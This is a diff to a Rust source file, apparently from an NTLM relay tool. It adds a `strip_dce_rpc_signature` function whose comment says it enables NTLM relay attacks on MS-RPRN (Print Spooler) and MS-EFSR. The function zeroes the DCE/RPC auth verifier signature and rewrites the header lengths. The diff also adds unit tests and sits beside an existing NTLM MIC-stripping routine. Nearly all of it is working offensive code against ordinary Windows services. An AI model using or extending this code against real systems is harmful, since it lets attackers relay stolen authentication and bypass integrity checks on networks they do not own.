@@ -597,6 +597,111 @@ pub fn strip_mic_from_type3(data: &[u8]) -> Vec<u8> {
     result
 }
 
+/// Strip the authentication verifier (signature) from a DCE/RPC request PDU.
+///
+/// This enables NTLM relay attacks against DCE/RPC services like MS-RPRN (Print Spooler)
+/// and MS-EFSR (Encrypting File System Remote) that normally require RPC-level authentication.
+///
+/// When relaying NTLM authentication through DCE/RPC pipes, the signature in the auth
+/// verifier becomes invalid if the relay modifies the challenge. Stripping it allows
+/// the relayed request to succeed even when the target requires RPC authentication.
+///
+/// DCE/RPC PDU structure with auth verifier:
+/// - RPC Header (24 bytes for request PDU)
+/// - Stub data (variable)
+/// - Auth Verifier (variable, if auth_length > 0):
+///   - pad_length (1 byte)
+///   - auth_type (1 byte) — 0x0A = NTLMSSP, 0x0E = Kerberos
+///   - auth_level (1 byte) — 0x05 = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
+///   - auth_reserved (1 byte)
+///   - auth_context_id (4 bytes)
+///   - signature (variable, typically 16 bytes for NTLMSSP MIC)
+///
+/// The function:
+/// 1. Validates DCE/RPC PDU structure (version 5.0, request type 0)
+/// 2. Reads auth_length from header (offset 10-11)
+/// 3. If auth_length > 0, zeros the signature bytes at the end of the PDU
+/// 4. Sets auth_length to 0 in the header
+/// 5. Adjusts fragment_length accordingly
+///
+/// Returns the modified PDU with auth verifier stripped, or the original if invalid.
+pub fn strip_dce_rpc_signature(data: &[u8]) -> Vec<u8> {
+    // DCE/RPC header minimum: 24 bytes for request PDU
+    if data.len() < 24 {
+        return data.to_vec();
+    }
+
+    // Validate RPC version (5.0)
+    if data[0] != 0x05 || data[1] != 0x00 {
+        return data.to_vec();
+    }
+
+    // Only strip from request PDUs (type 0)
+    let pdu_type = data[2];
+    if pdu_type != 0 {
+        return data.to_vec();
+    }
+
+    let mut result = data.to_vec();
+
+    // Read fragment length (offset 8-9)
+    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
+    if frag_len > data.len() || frag_len < 24 {
+        return data.to_vec();
+    }
+
+    // Read auth length (offset 10-11)
+    let auth_len = u16::from_le_bytes([data[10], data[11]]) as usize;
+    if auth_len == 0 {
+        return result; // No auth verifier to strip
+    }
+
+    // Auth verifier must fit within fragment
+    if auth_len > frag_len - 24 {
+        return data.to_vec(); // Malformed
+    }
+
+    // Auth verifier is at the end of the fragment
+    let auth_start = frag_len - auth_len;
+
+    // Parse auth verifier header (8 bytes):
+    // - pad_length (1 byte)
+    // - auth_type (1 byte)
+    // - auth_level (1 byte)
+    // - auth_reserved (1 byte)
+    // - auth_context_id (4 bytes)
+    if auth_len < 8 {
+        return data.to_vec(); // Too small for auth header
+    }
+
+    let pad_length = result[auth_start] as usize;
+    let _auth_type = result[auth_start + 1]; // 0x0A = NTLMSSP
+    let _auth_level = result[auth_start + 2]; // 0x05 = PKT_INTEGRITY
+
+    // Signature starts after auth header + padding
+    let sig_start = auth_start + 8 + pad_length;
+    let sig_len = auth_len - 8 - pad_length;
+
+    if sig_start + sig_len > result.len() {
+        return data.to_vec(); // Malformed
+    }
+
+    // Zero out the signature
+    for i in 0..sig_len {
+        result[sig_start + i] = 0;
+    }
+
+    // Set auth_length to 0 in header
+    result[10] = 0;
+    result[11] = 0;
+
+    // Adjust fragment_length to exclude the auth verifier
+    let new_frag_len = (frag_len - auth_len) as u16;
+    result[8..10].copy_from_slice(&new_frag_len.to_le_bytes());
+
+    result
+}
+
 // ═══════════════════════════════════════════════════════════
 // Tests
 // ═══════════════════════════════════════════════════════════
@@ -1135,7 +1240,7 @@ mod tests {
         let result = strip_mic_from_type3(&msg);
 
         let nt_off = u32::from_le_bytes([msg[24], msg[25], msg[26], msg[27]]) as usize;
-        let av_sizes = vec![
+        let av_sizes = [
             4 + 10, // NbDomain: header(4)+data(10)
             4 + 10, // NbTree: header(4)+data(10)
             4 + 14, // NbComputer: header(4)+data(14)
@@ -1156,5 +1261,223 @@ mod tests {
             &result[nt_off + 16 + 28 + 4..nt_off + 16 + 28 + 8],
             b"C\x00O\x00"
         );
+    }
+
+    // ===========================================================
+    // strip_dce_rpc_signature Tests
+    // ===========================================================
+
+    fn build_dce_rpc_request_with_auth() -> Vec<u8> {
+        let stub_data = vec![0xAA; 40];
+        let auth_sig = vec![0xBB; 16];
+
+        let mut pdu = Vec::new();
+        pdu.extend_from_slice(&[0x05, 0x00]);
+        pdu.push(0x00);
+        pdu.push(0x03);
+        pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
+        let stub_len = stub_data.len();
+        let auth_len = 8 + auth_sig.len();
+        let frag_len = 24 + stub_len + auth_len;
+        pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
+        pdu.extend_from_slice(&(auth_len as u16).to_le_bytes());
+        pdu.extend_from_slice(&1u32.to_le_bytes());
+        pdu.extend_from_slice(&(stub_len as u32).to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&stub_data);
+        pdu.push(0x00);
+        pdu.push(0x0A);
+        pdu.push(0x05);
+        pdu.push(0x00);
+        pdu.extend_from_slice(&0u32.to_le_bytes());
+        pdu.extend_from_slice(&auth_sig);
+
+        pdu
+    }
+
+    fn build_dce_rpc_request_without_auth() -> Vec<u8> {
+        let stub_data = vec![0xAA; 40];
+        let mut pdu = Vec::new();
+
+        pdu.extend_from_slice(&[0x05, 0x00]);
+        pdu.push(0x00);
+        pdu.push(0x03);
+        pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
+        let frag_len = 24 + stub_data.len();
+        pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&1u32.to_le_bytes());
+        pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&stub_data);
+
+        pdu
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_clears_signature() {
+        let msg = build_dce_rpc_request_with_auth();
+        let result = strip_dce_rpc_signature(&msg);
+
+        let auth_len = u16::from_le_bytes([result[10], result[11]]);
+        assert_eq!(auth_len, 0, "Auth length should be zeroed");
+
+        let orig_frag = u16::from_le_bytes([msg[8], msg[9]]);
+        let new_frag = u16::from_le_bytes([result[8], result[9]]);
+        assert!(new_frag < orig_frag, "Fragment length should be reduced");
+        assert_eq!(
+            new_frag as usize,
+            orig_frag as usize - 24,
+            "Should remove auth verifier"
+        );
+
+        // The signature is at the end of the original PDU, but after stripping it should be zeroed
+        // Original: 24 (header) + 40 (stub) + 8 (auth header) + 16 (sig) = 88 bytes
+        // After: 24 (header) + 40 (stub) = 64 bytes
+        // Signature was at offset 72..88 in original (24 + 40 + 8)
+        let orig_sig_start = 24 + 40 + 8;
+        for i in 0..16 {
+            assert_eq!(
+                result[orig_sig_start + i],
+                0,
+                "Signature byte {i} should be zeroed"
+            );
+        }
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_no_auth_returns_unchanged() {
+        let msg = build_dce_rpc_request_without_auth();
+        let result = strip_dce_rpc_signature(&msg);
+
+        assert_eq!(result.len(), msg.len());
+        let auth_len = u16::from_le_bytes([result[10], result[11]]);
+        assert_eq!(auth_len, 0);
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_short_pdu_returns_original() {
+        let data = [0u8; 20];
+        let result = strip_dce_rpc_signature(&data);
+        assert_eq!(result, data.to_vec());
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_wrong_version_returns_original() {
+        let mut data = vec![0u8; 24];
+        data[0] = 0x04;
+        data[1] = 0x00;
+        let result = strip_dce_rpc_signature(&data);
+        assert_eq!(result, data);
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_wrong_pdu_type_returns_original() {
+        let mut data = vec![0u8; 24];
+        data[0] = 0x05;
+        data[1] = 0x00;
+        data[2] = 0x0B;
+        let result = strip_dce_rpc_signature(&data);
+        assert_eq!(result, data);
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_malformed_frag_len_returns_original() {
+        let mut data = vec![0u8; 24];
+        data[0] = 0x05;
+        data[1] = 0x00;
+        data[2] = 0x00;
+        data[8] = 0xFF;
+        data[9] = 0xFF;
+        let result = strip_dce_rpc_signature(&data);
+        assert_eq!(result, data);
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_auth_too_large_returns_original() {
+        let mut data = vec![0u8; 24];
+        data[0] = 0x05;
+        data[1] = 0x00;
+        data[2] = 0x00;
+        data[8] = 24;
+        data[9] = 0;
+        data[10] = 20;
+        data[11] = 0;
+        let result = strip_dce_rpc_signature(&data);
+        assert_eq!(result, data);
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_auth_too_small_returns_original() {
+        let mut data = vec![0u8; 24];
+        data[0] = 0x05;
+        data[1] = 0x00;
+        data[2] = 0x00;
+        data[8] = 28;
+        data[9] = 0;
+        data[10] = 4;
+        data[11] = 0;
+        let result = strip_dce_rpc_signature(&data);
+        assert_eq!(result, data);
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_preserves_stub_data() {
+        let msg = build_dce_rpc_request_with_auth();
+        let result = strip_dce_rpc_signature(&msg);
+
+        for i in 0..40 {
+            assert_eq!(
+                result[24 + i],
+                0xAA,
+                "Stub data byte {i} should be preserved"
+            );
+        }
+    }
+
+    #[test]
+    fn test_strip_dce_rpc_with_padding() {
+        let stub_data = vec![0xAA; 40];
+        let auth_sig = vec![0xBB; 16];
+        let pad_length = 3;
+
+        let mut pdu = Vec::new();
+        pdu.extend_from_slice(&[0x05, 0x00]);
+        pdu.push(0x00);
+        pdu.push(0x03);
+        pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
+        let auth_len = 8 + pad_length + auth_sig.len();
+        let frag_len = 24 + stub_data.len() + auth_len;
+        pdu.extend_from_slice(&(frag_len as u16).to_le_bytes());
+        pdu.extend_from_slice(&(auth_len as u16).to_le_bytes());
+        pdu.extend_from_slice(&1u32.to_le_bytes());
+        pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&0u16.to_le_bytes());
+        pdu.extend_from_slice(&stub_data);
+        pdu.push(pad_length as u8);
+        pdu.push(0x0A);
+        pdu.push(0x05);
+        pdu.push(0x00);
+        pdu.extend_from_slice(&0u32.to_le_bytes());
+        pdu.extend_from_slice(&vec![0xCC; pad_length]);
+        pdu.extend_from_slice(&auth_sig);
+
+        let result = strip_dce_rpc_signature(&pdu);
+
+        let auth_len_result = u16::from_le_bytes([result[10], result[11]]);
+        assert_eq!(auth_len_result, 0);
+
+        let stub_len = 40;
+        let sig_start = 24 + stub_len + 8 + pad_length;
+        for i in 0..16 {
+            assert_eq!(
+                result[sig_start + i],
+                0,
+                "Signature byte {i} should be zeroed"
+            );
+        }
     }
 }
